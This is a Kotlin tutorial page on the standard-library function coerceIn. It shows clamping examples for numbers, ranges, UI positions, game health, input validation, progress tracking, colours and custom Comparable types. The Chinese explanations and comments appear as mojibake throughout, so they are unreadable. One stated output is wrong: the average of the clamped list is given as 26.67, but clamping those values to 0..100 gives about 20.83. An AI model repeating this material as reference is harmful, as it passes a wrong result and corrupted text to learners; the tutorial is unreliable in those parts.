pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong><code>coerceIn</code></strong> æ˜¯ Kotlin æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªæ‰©å±•å‡½æ•°ï¼Œç”¨äº<strong>å°†ä¸€ä¸ªå€¼é™åˆ¶åœ¨æŒ‡å®šçš„èŒƒå›´å†…</strong>ã€‚å¦‚æœå€¼åœ¨èŒƒå›´å†…ï¼Œåˆ™è¿”å›è¯¥å€¼ï¼›å¦‚æœå°äºæœ€å°å€¼ï¼Œåˆ™è¿”å›æœ€å°å€¼ï¼›å¦‚æœå¤§äºæœ€å¤§å€¼ï¼Œåˆ™è¿”å›æœ€å¤§å€¼ã€‚</p>
<h2 data-id="heading-0">åŸºæœ¬è¯­æ³•</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// é™åˆ¶åœ¨æœ€å°å€¼å’Œæœ€å¤§å€¼ä¹‹é—´</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Comparable&lt;T&gt;</span>&gt; T.<span class="hljs-title">coerceIn</span><span class="hljs-params">(minimumValue: <span class="hljs-type">T</span>, maximumValue: <span class="hljs-type">T</span>)</span></span>: T

<span class="hljs-comment">// é™åˆ¶åœ¨ä¸€ä¸ªèŒƒå›´å†…</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Comparable&lt;T&gt;</span>&gt; T.<span class="hljs-title">coerceIn</span><span class="hljs-params">(range: <span class="hljs-type">ClosedRange</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: T
</code></pre>
<h2 data-id="heading-1">åŸºæœ¬ç”¨æ³•</h2>
<h3 data-id="heading-2"><strong>1. æ•°å€¼èŒƒå›´é™åˆ¶</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åŸºæœ¬æ•´æ•°é™åˆ¶</span>
    <span class="hljs-keyword">val</span> x = <span class="hljs-number">10</span>
    <span class="hljs-keyword">val</span> clamped1 = x.coerceIn(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment">// 10 &gt; 5ï¼Œæ‰€ä»¥è¿”å› 5</span>
    println(clamped1)  <span class="hljs-comment">// è¾“å‡º: 5</span>
    
    <span class="hljs-keyword">val</span> clamped2 = x.coerceIn(<span class="hljs-number">20</span>, <span class="hljs-number">30</span>)  <span class="hljs-comment">// 10 &lt; 20ï¼Œæ‰€ä»¥è¿”å› 20</span>
    println(clamped2)  <span class="hljs-comment">// è¾“å‡º: 20</span>
    
    <span class="hljs-keyword">val</span> clamped3 = x.coerceIn(<span class="hljs-number">8</span>, <span class="hljs-number">12</span>)  <span class="hljs-comment">// 10 åœ¨èŒƒå›´å†…ï¼Œè¿”å› 10</span>
    println(clamped3)  <span class="hljs-comment">// è¾“å‡º: 10</span>
    
    <span class="hljs-comment">// æµ®ç‚¹æ•°é™åˆ¶</span>
    <span class="hljs-keyword">val</span> pi = <span class="hljs-number">3.14</span>
    <span class="hljs-keyword">val</span> clampedPi = pi.coerceIn(<span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>)  <span class="hljs-comment">// 3.14 &gt; 1.0ï¼Œè¿”å› 1.0</span>
    println(clampedPi)  <span class="hljs-comment">// è¾“å‡º: 1.0</span>
    
    <span class="hljs-comment">// å­—ç¬¦é™åˆ¶</span>
    <span class="hljs-keyword">val</span> char = <span class="hljs-string">'g'</span>
    <span class="hljs-keyword">val</span> clampedChar = char.coerceIn(<span class="hljs-string">'a'</span>, <span class="hljs-string">'f'</span>)  <span class="hljs-comment">// 'g' &gt; 'f'ï¼Œè¿”å› 'f'</span>
    println(clampedChar)  <span class="hljs-comment">// è¾“å‡º: f</span>
}
</code></pre>
<h3 data-id="heading-3"><strong>2. ä½¿ç”¨èŒƒå›´å¯¹è±¡</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> value = <span class="hljs-number">15</span>
    
    <span class="hljs-comment">// ä½¿ç”¨èŒƒå›´å¯¹è±¡</span>
    <span class="hljs-keyword">val</span> range1 = <span class="hljs-number">10.</span><span class="hljs-number">.20</span>
    <span class="hljs-keyword">val</span> result1 = value.coerceIn(range1)
    println(result1)  <span class="hljs-comment">// è¾“å‡º: 15</span>
    
    <span class="hljs-keyword">val</span> range2 = <span class="hljs-number">1.</span><span class="hljs-number">.5</span>
    <span class="hljs-keyword">val</span> result2 = value.coerceIn(range2)
    println(result2)  <span class="hljs-comment">// è¾“å‡º: 5</span>
    
    <span class="hljs-keyword">val</span> range3 = <span class="hljs-number">20.</span><span class="hljs-number">.30</span>
    <span class="hljs-keyword">val</span> result3 = value.coerceIn(range3)
    println(result3)  <span class="hljs-comment">// è¾“å‡º: 20</span>
    
    <span class="hljs-comment">// ä½¿ç”¨ untilï¼ˆåŠå¼€åŒºé—´ï¼Œéœ€è¦å…ˆè½¬æ¢ä¸ºé—­åŒºé—´ï¼‰</span>
    <span class="hljs-keyword">val</span> halfOpen = <span class="hljs-number">10</span> until <span class="hljs-number">20</span>  <span class="hljs-comment">// 10..19</span>
    <span class="hljs-keyword">val</span> closedRange = <span class="hljs-number">10.</span><span class="hljs-number">.19</span>
    println(value.coerceIn(closedRange))  <span class="hljs-comment">// è¾“å‡º: 15</span>
}
</code></pre>
<h2 data-id="heading-4">å®é™…åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-5"><strong>1. UI å¼€å‘ä¸­çš„è¾¹ç•Œæ£€æŸ¥</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">View</span>(<span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> y: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> width: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> height: <span class="hljs-built_in">Int</span>) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">moveTo</span><span class="hljs-params">(newX: <span class="hljs-type">Int</span>, newY: <span class="hljs-type">Int</span>, screenWidth: <span class="hljs-type">Int</span>, screenHeight: <span class="hljs-type">Int</span>)</span></span>: View {
        <span class="hljs-comment">// ç¡®ä¿è§†å›¾ä¸ä¼šç§»å‡ºå±å¹•</span>
        <span class="hljs-keyword">val</span> clampedX = newX.coerceIn(<span class="hljs-number">0</span>, screenWidth - width)
        <span class="hljs-keyword">val</span> clampedY = newY.coerceIn(<span class="hljs-number">0</span>, screenHeight - height)
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.copy(x = clampedX, y = clampedY)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> screen = View(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">800</span>, <span class="hljs-number">600</span>)
    <span class="hljs-keyword">val</span> dialog = View(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>, <span class="hljs-number">150</span>)
    
    <span class="hljs-comment">// å°è¯•ç§»åŠ¨åˆ°å±å¹•å¤–</span>
    <span class="hljs-keyword">val</span> moved = dialog.moveTo(<span class="hljs-number">700</span>, <span class="hljs-number">500</span>, screen.width, screen.height)
    println(<span class="hljs-string">"Dialog position: (<span class="hljs-subst">${moved.x}</span>, <span class="hljs-subst">${moved.y}</span>)"</span>)
    <span class="hljs-comment">// è¾“å‡º: Dialog position: (600, 450)</span>
    <span class="hljs-comment">// å› ä¸º 700 &gt; (800-200=600)ï¼Œ500 &gt; (600-150=450)</span>
}
</code></pre>
<h3 data-id="heading-6"><strong>2. æ¸¸æˆå¼€å‘</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GameCharacter</span>(
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">var</span> health: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">var</span> position: Position
) {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Position</span>(<span class="hljs-keyword">var</span> x: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">var</span> y: <span class="hljs-built_in">Int</span>)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">move</span><span class="hljs-params">(dx: <span class="hljs-type">Int</span>, dy: <span class="hljs-type">Int</span>, worldBounds: <span class="hljs-type">IntRange</span>)</span></span> {
        position.x = (position.x + dx).coerceIn(worldBounds)
        position.y = (position.y + dy).coerceIn(worldBounds)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">takeDamage</span><span class="hljs-params">(damage: <span class="hljs-type">Int</span>)</span></span> {
        health = (health - damage).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">heal</span><span class="hljs-params">(amount: <span class="hljs-type">Int</span>)</span></span> {
        health = (health + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> player = GameCharacter(<span class="hljs-string">"Hero"</span>, <span class="hljs-number">80</span>, GameCharacter.Position(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>))
    <span class="hljs-keyword">val</span> worldBounds = <span class="hljs-number">0.</span><span class="hljs-number">.10</span>
    
    <span class="hljs-comment">// ç§»åŠ¨ - ä¸ä¼šè¶…å‡ºè¾¹ç•Œ</span>
    player.move(<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, worldBounds)
    println(<span class="hljs-string">"Position: (<span class="hljs-subst">${player.position.x}</span>, <span class="hljs-subst">${player.position.y}</span>)"</span>)
    <span class="hljs-comment">// è¾“å‡º: Position: (8, 10) è€Œä¸æ˜¯ (8, 12)</span>
    
    <span class="hljs-comment">// å—åˆ°ä¼¤å®³</span>
    player.takeDamage(<span class="hljs-number">90</span>)
    println(<span class="hljs-string">"Health: <span class="hljs-subst">${player.health}</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: Health: 0</span>
    
    <span class="hljs-comment">// æ²»ç–—</span>
    player.heal(<span class="hljs-number">120</span>)
    println(<span class="hljs-string">"Health: <span class="hljs-subst">${player.health}</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: Health: 100</span>
}
</code></pre>
<h3 data-id="heading-7"><strong>3. æ•°æ®éªŒè¯å’Œè§„èŒƒåŒ–</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInput</span>(
    <span class="hljs-keyword">val</span> username: String,
    <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">val</span> score: <span class="hljs-built_in">Double</span>
) {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> AGE_RANGE = <span class="hljs-number">0.</span><span class="hljs-number">.150</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> SCORE_RANGE = <span class="hljs-number">0.0</span>.<span class="hljs-number">.100</span><span class="hljs-number">.0</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> USERNAME_LENGTH_RANGE = <span class="hljs-number">3.</span><span class="hljs-number">.20</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">validate</span><span class="hljs-params">()</span></span>: ValidatedUserInput {
        <span class="hljs-keyword">val</span> validatedAge = age.coerceIn(AGE_RANGE)
        <span class="hljs-keyword">val</span> validatedScore = score.coerceIn(SCORE_RANGE)
        <span class="hljs-keyword">val</span> validatedUsername = <span class="hljs-keyword">if</span> (username.length <span class="hljs-keyword">in</span> USERNAME_LENGTH_RANGE) {
            username
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// æˆªæ–­æˆ–å¤„ç†ç”¨æˆ·åé•¿åº¦</span>
            username.take(USERNAME_LENGTH_RANGE.last)
        }
        
        <span class="hljs-keyword">return</span> ValidatedUserInput(validatedUsername, validatedAge, validatedScore)
    }
}

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValidatedUserInput</span>(
    <span class="hljs-keyword">val</span> username: String,
    <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>,
    <span class="hljs-keyword">val</span> score: <span class="hljs-built_in">Double</span>
)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> input1 = UserInput(<span class="hljs-string">"john_doe"</span>, <span class="hljs-number">25</span>, <span class="hljs-number">85.5</span>)
    <span class="hljs-keyword">val</span> validated1 = input1.validate()
    println(validated1)  <span class="hljs-comment">// è¾“å‡º: ValidatedUserInput(username=john_doe, age=25, score=85.5)</span>
    
    <span class="hljs-keyword">val</span> input2 = UserInput(<span class="hljs-string">"jo"</span>, <span class="hljs-number">200</span>, <span class="hljs-number">150.0</span>)  <span class="hljs-comment">// ä¸åˆè§„çš„æ•°æ®</span>
    <span class="hljs-keyword">val</span> validated2 = input2.validate()
    println(validated2)  
    <span class="hljs-comment">// è¾“å‡º: ValidatedUserInput(username=jo, age=150, score=100.0)</span>
}
</code></pre>
<h3 data-id="heading-8"><strong>4. è¿›åº¦å’Œç™¾åˆ†æ¯”è®¡ç®—</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProgressTracker</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> totalSteps: <span class="hljs-built_in">Int</span>) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentStep: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">progress</span><span class="hljs-params">(percent: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Float</span> {
        <span class="hljs-comment">// ç¡®ä¿ç™¾åˆ†æ¯”åœ¨ 0-100 ä¹‹é—´</span>
        <span class="hljs-keyword">val</span> validPercent = percent.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
        <span class="hljs-keyword">return</span> validPercent / <span class="hljs-number">100f</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">advance</span><span class="hljs-params">(steps: <span class="hljs-type">Int</span>)</span></span> {
        currentStep = (currentStep + steps).coerceIn(<span class="hljs-number">0</span>, totalSteps)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">retreat</span><span class="hljs-params">(steps: <span class="hljs-type">Int</span>)</span></span> {
        currentStep = (currentStep - steps).coerceIn(<span class="hljs-number">0</span>, totalSteps)
    }
    
    <span class="hljs-keyword">val</span> progressPercentage: <span class="hljs-built_in">Int</span>
        <span class="hljs-keyword">get</span>() = (currentStep * <span class="hljs-number">100</span> / totalSteps).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> tracker = ProgressTracker(<span class="hljs-number">50</span>)
    
    tracker.advance(<span class="hljs-number">30</span>)
    println(<span class="hljs-string">"Progress: <span class="hljs-subst">${tracker.progressPercentage}</span>%"</span>)  <span class="hljs-comment">// è¾“å‡º: Progress: 60%</span>
    
    tracker.advance(<span class="hljs-number">40</span>)  <span class="hljs-comment">// å°è¯•è¶…è¿‡æ€»é‡</span>
    println(<span class="hljs-string">"Progress: <span class="hljs-subst">${tracker.progressPercentage}</span>%"</span>)  <span class="hljs-comment">// è¾“å‡º: Progress: 100%</span>
    
    tracker.retreat(<span class="hljs-number">100</span>)  <span class="hljs-comment">// å°è¯•ä½äº 0</span>
    println(<span class="hljs-string">"Progress: <span class="hljs-subst">${tracker.progressPercentage}</span>%"</span>)  <span class="hljs-comment">// è¾“å‡º: Progress: 0%</span>
    
    <span class="hljs-keyword">val</span> progress = tracker.progress(<span class="hljs-number">150</span>)  <span class="hljs-comment">// è¶…è¿‡ 100%</span>
    println(<span class="hljs-string">"Progress: <span class="hljs-variable">$progress</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: Progress: 1.0</span>
}
</code></pre>
<h3 data-id="heading-9"><strong>5. é¢œè‰²å€¼å¤„ç†</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span>(<span class="hljs-keyword">val</span> r: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> g: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> b: <span class="hljs-built_in">Int</span>) {
    <span class="hljs-keyword">init</span> {
        require(r <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span><span class="hljs-number">.255</span> &amp;&amp; g <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span><span class="hljs-number">.255</span> &amp;&amp; b <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span><span class="hljs-number">.255</span>) {
            <span class="hljs-string">"é¢œè‰²å€¼å¿…é¡»åœ¨ 0-255 ä¹‹é—´"</span>
        }
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fromValues</span><span class="hljs-params">(red: <span class="hljs-type">Int</span>, green: <span class="hljs-type">Int</span>, blue: <span class="hljs-type">Int</span>)</span></span>: Color {
            <span class="hljs-comment">// ä½¿ç”¨ coerceIn ç¡®ä¿é¢œè‰²å€¼åœ¨æœ‰æ•ˆèŒƒå›´å†…</span>
            <span class="hljs-keyword">val</span> safeRed = red.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> safeGreen = green.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> safeBlue = blue.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">return</span> Color(safeRed, safeGreen, safeBlue)
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">darken</span><span class="hljs-params">(color: <span class="hljs-type">Color</span>, amount: <span class="hljs-type">Int</span>)</span></span>: Color {
            <span class="hljs-keyword">val</span> newRed = (color.r - amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newGreen = (color.g - amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newBlue = (color.b - amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">return</span> Color(newRed, newGreen, newBlue)
        }
        
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">lighten</span><span class="hljs-params">(color: <span class="hljs-type">Color</span>, amount: <span class="hljs-type">Int</span>)</span></span>: Color {
            <span class="hljs-keyword">val</span> newRed = (color.r + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newGreen = (color.g + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">val</span> newBlue = (color.b + amount).coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
            <span class="hljs-keyword">return</span> Color(newRed, newGreen, newBlue)
        }
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åˆ›å»ºé¢œè‰²ï¼Œè‡ªåŠ¨å¤„ç†è¾¹ç•Œ</span>
    <span class="hljs-keyword">val</span> color1 = Color.fromValues(<span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>)  <span class="hljs-comment">// 300 ä¼šè¢«é™åˆ¶ä¸º 255</span>
    println(color1)  <span class="hljs-comment">// è¾“å‡º: Color(r=100, g=200, b=255)</span>
    
    <span class="hljs-keyword">val</span> darker = Color.darken(color1, <span class="hljs-number">150</span>)  <span class="hljs-comment">// å°è¯•å‡å°‘ 150</span>
    println(darker)  <span class="hljs-comment">// è¾“å‡º: Color(r=0, g=50, b=105)</span>
    
    <span class="hljs-keyword">val</span> lighter = Color.lighten(color1, <span class="hljs-number">200</span>)  <span class="hljs-comment">// å°è¯•å¢åŠ  200</span>
    println(lighter)  <span class="hljs-comment">// è¾“å‡º: Color(r=255, g=255, b=255)</span>
}
</code></pre>
<h2 data-id="heading-10">é«˜çº§ç”¨æ³•</h2>
<h3 data-id="heading-11"><strong>1. è‡ªå®šä¹‰æ¯”è¾ƒç±»å‹</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// è‡ªå®šä¹‰å¯æ¯”è¾ƒç±»å‹</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Temperature</span>(<span class="hljs-keyword">val</span> celsius: <span class="hljs-built_in">Double</span>) : Comparable&lt;Temperature&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(other: <span class="hljs-type">Temperature</span>)</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> celsius.compareTo(other.celsius)
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">val</span> WATER_FREEZING = Temperature(<span class="hljs-number">0.0</span>)
        <span class="hljs-keyword">val</span> WATER_BOILING = Temperature(<span class="hljs-number">100.0</span>)
        <span class="hljs-keyword">val</span> HUMAN_BODY = Temperature(<span class="hljs-number">37.0</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> currentTemp = Temperature(<span class="hljs-number">25.0</span>)
    <span class="hljs-keyword">val</span> comfortableRange = Temperature(<span class="hljs-number">20.0</span>)..Temperature(<span class="hljs-number">26.0</span>)
    
    <span class="hljs-keyword">val</span> adjustedTemp = currentTemp.coerceIn(comfortableRange)
    println(<span class="hljs-string">"èˆ’é€‚æ¸©åº¦: <span class="hljs-subst">${adjustedTemp.celsius}</span>Â°C"</span>)  <span class="hljs-comment">// è¾“å‡º: èˆ’é€‚æ¸©åº¦: 25.0Â°C</span>
    
    <span class="hljs-keyword">val</span> hotTemp = Temperature(<span class="hljs-number">40.0</span>)
    <span class="hljs-keyword">val</span> safeTemp = hotTemp.coerceIn(Temperature.WATER_FREEZING, Temperature.WATER_BOILING)
    println(<span class="hljs-string">"å®‰å…¨æ¸©åº¦: <span class="hljs-subst">${safeTemp.celsius}</span>Â°C"</span>)  <span class="hljs-comment">// è¾“å‡º: å®‰å…¨æ¸©åº¦: 40.0Â°C</span>
}
</code></pre>
<h3 data-id="heading-12"><strong>2. ä¸é›†åˆæ“ä½œç»“åˆ</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> values = listOf(-<span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">25</span>, <span class="hljs-number">35</span>, <span class="hljs-number">45</span>)
    <span class="hljs-keyword">val</span> range = <span class="hljs-number">0.</span><span class="hljs-number">.30</span>
    
    <span class="hljs-comment">// å°†åˆ—è¡¨ä¸­çš„æ‰€æœ‰å€¼é™åˆ¶åœ¨èŒƒå›´å†…</span>
    <span class="hljs-keyword">val</span> clampedValues = values.map { it.coerceIn(range) }
    println(clampedValues)  <span class="hljs-comment">// è¾“å‡º: [0, 5, 15, 25, 30, 30]</span>
    
    <span class="hljs-comment">// è®¡ç®—å¹³å‡å€¼ï¼Œä½†å…ˆé™åˆ¶æ¯ä¸ªå€¼</span>
    <span class="hljs-keyword">val</span> average = values
        .map { it.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>) }
        .average()
    println(<span class="hljs-string">"é™åˆ¶åçš„å¹³å‡å€¼: <span class="hljs-variable">$average</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: é™åˆ¶åçš„å¹³å‡å€¼: 26.666666666666668</span>
}
</code></pre>
<h3 data-id="heading-13"><strong>3. é“¾å¼è°ƒç”¨</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RangeSlider</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> value: <span class="hljs-built_in">Double</span>, <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> range: ClosedRange&lt;<span class="hljs-built_in">Double</span>&gt;) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">adjust</span><span class="hljs-params">(amount: <span class="hljs-type">Double</span>)</span></span>: RangeSlider {
        value = (value + amount).coerceIn(range)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">multiply</span><span class="hljs-params">(factor: <span class="hljs-type">Double</span>)</span></span>: RangeSlider {
        value = (value * factor).coerceIn(range)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getValue</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Double</span> = value
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> slider = RangeSlider(<span class="hljs-number">50.0</span>, <span class="hljs-number">0.0</span>.<span class="hljs-number">.100</span><span class="hljs-number">.0</span>)
    
    <span class="hljs-keyword">val</span> result = slider
        .adjust(<span class="hljs-number">30.0</span>)    <span class="hljs-comment">// 80.0</span>
        .multiply(<span class="hljs-number">1.5</span>)   <span class="hljs-comment">// 120.0 â†’ é™åˆ¶ä¸º 100.0</span>
        .adjust(-<span class="hljs-number">150.0</span>)  <span class="hljs-comment">// -50.0 â†’ é™åˆ¶ä¸º 0.0</span>
        .getValue()
    
    println(<span class="hljs-string">"æ»‘å—å€¼: <span class="hljs-variable">$result</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: æ»‘å—å€¼: 0.0</span>
}
</code></pre>
